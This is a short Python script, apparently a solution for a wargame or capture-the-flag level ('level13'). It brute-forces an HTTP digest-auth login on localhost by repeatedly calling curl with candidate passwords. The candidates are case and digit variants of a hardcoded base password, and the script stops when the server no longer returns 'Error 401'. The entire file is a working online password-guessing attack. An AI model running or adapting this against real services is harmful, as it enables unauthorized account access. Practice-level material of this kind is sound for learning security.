import subprocess

def check_result(fn_cmd):
    result = subprocess.run(fn_cmd, stdout=subprocess.PIPE).stdout.decode('utf-8')
    return error_string not in result

# variables
init_pw = list("feidet0n")
cur_pw = list()
cmd = ['curl', '--digest', '--user', 'level13:feidet1n', 'http://localhost']
error_string = "Error 401"
cmd[3] = 'level13:' + ''.join(init_pw)

# first position
for i in range(0, 8):
    # skip safe number
    if i == 6:
        continue
    # amount uppercase
    for j in range(0, 8 - i):
        # iterate backwards uppercase
        for k in range(0, 8 - i):
            # reset
            cur_pw = init_pw.copy()
            # safe 1st uppercase
            cur_pw[i] = cur_pw[i].upper()
            # iterate amount uppercase
            for l in range(0, j + 1):
                if 7 - k - l >= i and 7 - k - l != 6:
                    cur_pw[7 - k - l] = cur_pw[7 - k - l].upper()
                # iterate number
                for z in range(0, 10):
                    cur_pw[6] = str(z)
                    cmd[3] = 'level13:' + ''.join(cur_pw)
                    print(cmd[3])
                    if check_result(cmd):
                        print("The Password is:")
                        print(cmd[3])
                        exit()
